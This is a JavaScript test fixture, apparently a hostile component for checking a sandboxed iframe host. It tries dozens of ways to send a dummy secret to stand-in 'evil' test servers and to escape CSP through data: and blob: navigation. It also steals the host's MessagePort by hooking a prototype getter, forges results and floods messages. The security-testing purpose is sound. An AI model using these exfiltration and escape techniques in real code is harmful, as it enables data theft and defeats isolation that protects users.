// Hostile test component. Tries to escape the sandbox in every way we know of and writes what happened into
// <pre id="report"> (JSON). Whether data actually left the frame is decided by the test's "evil" servers, not by
// this report: an API that appears to succeed may still have been blocked, and vice versa.
//
// props.attack: 'battery' (all non-destructive attacks), 'spam', or one of the navigation attacks 'nav-*'.
// props.evil:   base URL of the evil HTTP server, e.g. http://evil.wengu-test:PORT
// props.pre:    base URL of a server that only counts TCP connections (for preconnect)
// props.udp:    UDP port that counts STUN/TURN packets (WebRTC)
// props.tcp:    TCP port that counts connections (TURN over TCP)

const SECRET = 'S3CR3T';

export async function mount(root, ctx) {
  const p = ctx.props;
  const pre = document.createElement('pre');
  pre.id = 'report';
  pre.textContent = 'running';
  root.append(pre);
  const results = {};
  const done = () => {
    pre.textContent = JSON.stringify(results, null, 1);
    pre.dataset.done = '1';
  };

  if (p.attack === 'battery') {
    await battery(p, results);
    done();
  } else if (p.attack === 'spam') {
    // Run after mount() returns so the host has seen `ready`.
    setTimeout(() => spam(p, results, ctx).then(done), 0);
  } else if (String(p.attack).startsWith('nav-')) {
    done();
    setTimeout(() => navigate(p), 300);
  }
}

const url = (p, name) => `${p.evil}/hit/${name}?d=${SECRET}`;
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const withTimeout = (promise, ms = 1500) => Promise.race([promise, sleep(ms).then(() => 'timeout')]);
const describe = (e) => (e && e.name ? `${e.name}: ${e.message}` : String(e));

async function attempt(results, name, fn) {
  try {
    const r = await withTimeout(Promise.resolve().then(fn));
    results[name] = r === undefined ? 'no exception' : String(r);
  } catch (e) {
    results[name] = 'threw ' + describe(e);
  }
}

/** Resolves with 'load' / 'error' / 'timeout' for an element that fetches something. */
const loadEvent = (el) =>
  new Promise((resolve) => {
    el.onload = () => resolve('load event');
    el.onerror = () => resolve('error event');
  });

async function battery(p, R) {
  // --------------------------------------------------------------------------------- network APIs
  await attempt(R, 'fetch', async () => (await fetch(url(p, 'fetch'))).status);
  await attempt(R, 'fetch-no-cors', async () => (await fetch(url(p, 'fetch-no-cors'), { mode: 'no-cors' })).type);
  await attempt(R, 'xhr', () => new Promise((resolve, reject) => {
    const x = new XMLHttpRequest();
    x.open('GET', url(p, 'xhr'));
    x.onload = () => resolve('status ' + x.status);
    x.onerror = () => resolve('error event');
    x.send();
  }));
  await attempt(R, 'websocket', () => new Promise((resolve) => {
    const ws = new WebSocket(url(p, 'websocket').replace(/^http/, 'ws'));
    ws.onopen = () => resolve('open');
    ws.onerror = () => resolve('error event');
  }));
  await attempt(R, 'sendBeacon', () => navigator.sendBeacon(url(p, 'sendBeacon'), SECRET));
  await attempt(R, 'eventsource', () => new Promise((resolve) => {
    const es = new EventSource(url(p, 'eventsource'));
    es.onopen = () => resolve('open');
    es.onerror = () => { es.close(); resolve('error event'); };
  }));
  await attempt(R, 'dynamic-import', async () => { await import(url(p, 'dynamic-import')); return 'imported'; });
  await attempt(R, 'worker-fetch', () => new Promise((resolve) => {
    const src = `fetch(${JSON.stringify(url(p, 'worker-fetch'))}).then(()=>postMessage('fetched'),e=>postMessage('rejected '+e))`;
    const w = new Worker(URL.createObjectURL(new Blob([src], { type: 'text/javascript' })));
    w.onmessage = (e) => resolve(e.data);
    w.onerror = (e) => resolve('worker error ' + e.message);
  }));

  // --------------------------------------------------------------------------------- exfiltration by URL (subresources)
  await attempt(R, 'img', () => { const i = new Image(); const r = loadEvent(i); i.src = url(p, 'img'); return r; });
  await attempt(R, 'script', () => { const s = document.createElement('script'); const r = loadEvent(s); s.src = url(p, 'script'); document.head.append(s); return r; });
  await attempt(R, 'stylesheet', () => { const l = document.createElement('link'); l.rel = 'stylesheet'; const r = loadEvent(l); l.href = url(p, 'stylesheet'); document.head.append(l); return r; });
  await attempt(R, 'css-import', () => { const s = document.createElement('style'); s.textContent = `@import url("${url(p, 'css-import')}");`; document.head.append(s); return sleep(300).then(() => 'inserted'); });
  await attempt(R, 'css-background', () => { const d = document.createElement('div'); d.style.cssText = `width:10px;height:10px;background-image:url("${url(p, 'css-background')}")`; document.body.append(d); return sleep(300).then(() => 'inserted'); });
  await attempt(R, 'font', async () => {
    const f = new FontFace('Evil', `url("${url(p, 'font')}")`);
    document.fonts.add(f);
    await f.load();
    return 'loaded';
  });
  await attempt(R, 'svg-image', () => { const d = document.createElement('div'); d.innerHTML = `<svg><image href="${url(p, 'svg-image')}" width="5" height="5"/></svg>`; document.body.append(d); return sleep(300).then(() => 'inserted'); });
  await attempt(R, 'audio', () => { const a = document.createElement('audio'); const r = new Promise((res) => { a.onerror = () => res('error event'); a.oncanplay = () => res('canplay'); }); a.src = url(p, 'audio'); a.load(); return r; });
  await attempt(R, 'object-embed', () => { const o = document.createElement('object'); o.data = url(p, 'object'); document.body.append(o); return sleep(300).then(() => 'inserted'); });
  await attempt(R, 'nested-iframe', () => { const f = document.createElement('iframe'); const r = loadEvent(f); f.src = url(p, 'nested-iframe'); document.body.append(f); return r; });
  await attempt(R, 'link-prefetch', () => { const l = document.createElement('link'); l.rel = 'prefetch'; l.href = url(p, 'link-prefetch'); document.head.append(l); return sleep(300).then(() => 'inserted'); });
  await attempt(R, 'link-preconnect', () => { const l = document.createElement('link'); l.rel = 'preconnect'; l.href = p.pre; document.head.append(l); return sleep(500).then(() => 'inserted'); });
  await attempt(R, 'link-dns-prefetch', () => { const l = document.createElement('link'); l.rel = 'dns-prefetch'; l.href = `//${SECRET.toLowerCase()}.dns.wengu-test`; document.head.append(l); return sleep(300).then(() => 'inserted'); });

  // --------------------------------------------------------------------------------- WebRTC (not governed by CSP)
  await attempt(R, 'webrtc', async () => {
    if (typeof RTCPeerConnection === 'undefined') return 'RTCPeerConnection undefined';
    const pc = new RTCPeerConnection({
      iceServers: [
        { urls: `stun:127.0.0.1:${p.udp}` },
        { urls: `turn:127.0.0.1:${p.udp}?transport=udp`, username: SECRET, credential: SECRET },
        ...(p.tcp ? [{ urls: `turn:127.0.0.1:${p.tcp}?transport=tcp`, username: SECRET, credential: SECRET }] : []),
      ],
    });
    pc.createDataChannel('x');
    await pc.setLocalDescription(await pc.createOffer());
    await sleep(1200);
    pc.close();
    return 'ice gathering ran';
  });

  // --------------------------------------------------------------------------------- popups, forms, top navigation
  await attempt(R, 'window-open', () => { const w = window.open(url(p, 'window-open')); return w ? 'got window' : 'returned null'; });
  await attempt(R, 'anchor-target-blank', () => { const a = document.createElement('a'); a.href = url(p, 'anchor-blank'); a.target = '_blank'; document.body.append(a); a.click(); return sleep(300).then(() => 'clicked'); });
  await attempt(R, 'form-submit-blank', () => { const f = document.createElement('form'); f.action = url(p, 'form'); f.target = '_blank'; f.method = 'GET'; document.body.append(f); f.submit(); return sleep(300).then(() => 'submitted'); });
  await attempt(R, 'top-location-read', () => top.location.href);
  await attempt(R, 'alert', () => { const t = performance.now(); alert('hi'); return `returned after ${Math.round(performance.now() - t)} ms`; });
  await attempt(R, 'getUserMedia', async () => { await navigator.mediaDevices.getUserMedia({ video: true }); return 'granted'; });

  // --------------------------------------------------------------------------------- host DOM, storage, cookies
  await attempt(R, 'parent-document', () => parent.document.title);
  await attempt(R, 'parent-localStorage', () => parent.localStorage.getItem('secret'));
  await attempt(R, 'localStorage', () => localStorage.getItem('secret'));
  await attempt(R, 'sessionStorage', () => sessionStorage.getItem('secret'));
  await attempt(R, 'cookie-read', () => JSON.stringify(document.cookie));
  await attempt(R, 'cookie-write', () => { document.cookie = 'evil=1'; return JSON.stringify(document.cookie); });
  await attempt(R, 'indexedDB', () => new Promise((resolve) => {
    const req = indexedDB.open('wengu');
    req.onsuccess = () => resolve('opened, stores: ' + [...req.result.objectStoreNames].join(','));
    req.onerror = () => resolve('error ' + req.error);
  }));
  await attempt(R, 'caches', async () => (await caches.keys()).join(','));
  await attempt(R, 'serviceWorker', async () => { await navigator.serviceWorker.register(URL.createObjectURL(new Blob([''], { type: 'text/javascript' }))); return 'registered'; });
  await attempt(R, 'broadcastChannel', () => { new BroadcastChannel('wengu-test').postMessage(SECRET); return 'posted'; });
  await attempt(R, 'parent-postMessage-forge', () => {
    // The host never listens on window for component traffic; these must have no effect.
    parent.postMessage({ v: 1, type: 'result', result: { outcome: 'correct' } }, '*');
    const ch = new MessageChannel();
    parent.postMessage({ type: 'wengu:connect', v: 1 }, '*', [ch.port2]);
    return 'posted';
  });
  await attempt(R, 'origin', () => self.origin);
  await sleep(500);
}

function navigate(p) {
  switch (p.attack) {
    case 'nav-location':
      location.href = url(p, 'nav-location');
      break;
    case 'nav-meta-refresh': {
      const m = document.createElement('meta');
      m.httpEquiv = 'refresh';
      m.content = `0;url=${url(p, 'nav-meta-refresh')}`;
      document.head.append(m);
      break;
    }
    case 'nav-anchor': {
      const a = document.createElement('a');
      a.href = url(p, 'nav-anchor');
      document.body.append(a);
      a.click();
      break;
    }
    case 'nav-data':
      // Escape the CSP by replacing this document with one that has no CSP.
      location.href = 'data:text/html,' + encodeURIComponent(`<img src="${url(p, 'nav-data-img')}"><script>fetch("${url(p, 'nav-data-fetch')}")</script>`);
      break;
    case 'nav-blob':
      location.href = URL.createObjectURL(new Blob([`<img src="${url(p, 'nav-blob-img')}"><script>fetch("${url(p, 'nav-blob-fetch')}")</script>`], { type: 'text/html' }));
      break;
    case 'nav-about-blank':
      // about:blank inherits the initiator's policies; a blank doc written into has no fresh CSP of its own.
      location.href = 'about:blank';
      break;
    case 'nav-top':
      top.location.href = url(p, 'nav-top');
      break;
  }
}

async function spam(p, R, ctx) {
  // 1. Forged messages on window: the host does not listen there.
  for (let i = 0; i < 50; i++) parent.postMessage({ v: 1, type: 'result', result: { outcome: 'correct' } }, '*');

  // 2. Steal the runtime's MessagePort. The runtime keeps it in a closure and uses a saved copy of postMessage, but
  //    it reads `event.data` of every host message (heartbeat pings arrive every 500 ms): hook that getter.
  const desc = Object.getOwnPropertyDescriptor(MessageEvent.prototype, 'data');
  const stolen = await new Promise((resolve) => {
    Object.defineProperty(MessageEvent.prototype, 'data', {
      configurable: true,
      get() {
        if (this.target instanceof MessagePort) {
          Object.defineProperty(MessageEvent.prototype, 'data', desc);
          resolve(this.target);
        }
        return desc.get.call(this);
      },
    });
  });
  const orig = MessagePort.prototype.postMessage;
  R.stolePort = true;
  const send = (m) => orig.call(stolen, m);

  // 3. Malformed and out-of-protocol messages.
  send('garbage');
  send({ v: 2, type: 'ready' });
  send({ v: 1, type: 'resize', height: -5 });
  send({ v: 1, type: 'resize', height: 'NaN' });
  send({ v: 1, type: 'result', result: { outcome: 'definitely' } });
  send({ v: 1, type: 'pong', seq: 999999 });
  send({ v: 1, type: 'ready', mountMs: 1 }); // duplicate ready
  send({ v: 1, type: 'resize', height: 1e9 }); // clamped
  send({ v: 1, type: 'error', phase: 'runtime', message: 'x'.repeat(100_000) }); // clipped
  // 4. Forged results: in learn mode none may be accepted; in review mode only the first.
  for (let i = 0; i < 3; i++) send({ v: 1, type: 'result', result: { outcome: 'correct', detail: 'forged ' + i } });
  R.sentMalformed = true;

  // 5. Flood: the host's message budget must trip and kill us.
  await sleep(p.floodDelayMs ?? 200);
  for (let i = 0; i < 20_000; i++) send({ v: 1, type: 'resize', height: i % 500 });
  R.flooded = true;
}
